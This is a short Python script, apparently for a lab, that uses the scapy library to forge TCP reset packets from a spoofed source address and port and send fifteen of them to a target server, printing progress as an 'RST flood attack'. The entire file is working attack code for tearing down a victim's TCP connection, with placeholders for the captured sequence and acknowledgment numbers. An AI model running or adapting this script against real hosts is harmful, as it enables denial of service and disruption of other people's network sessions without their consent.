from scapy.all import *
import time

# Define the target IP and port
target_ip = "192.168.100.50"  # Replace with the IP of your server
target_port = 12345          # Port used by the server

# Define the source IP and port (simulate an existing connection)
source_ip = "192.168.100.51"  # Replace with the IP of the attacking machine
source_port = 54321          # Replace with a port used by the attacker

# Capture the sequence and acknowledgment numbers from an established connection
seq_number = 1  # Replace with the actual sequence number
ack_number = 1  # Replace with the actual acknowledgment number

# Define the number of packets and the interval
packet_count = 15  # Number of packets to send
interval = 0.1     # Interval between packets in seconds

# Create and send TCP RST packets
print(f"Starting RST flood attack on {target_ip}:{target_port}")
for i in range(packet_count):
    pkt = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="R", seq=seq_number, ack=ack_number)
    send(pkt, verbose=0)
    print(f"Sent RST packet {i+1}/{packet_count}")
    time.sleep(interval)

print("Attack completed.")
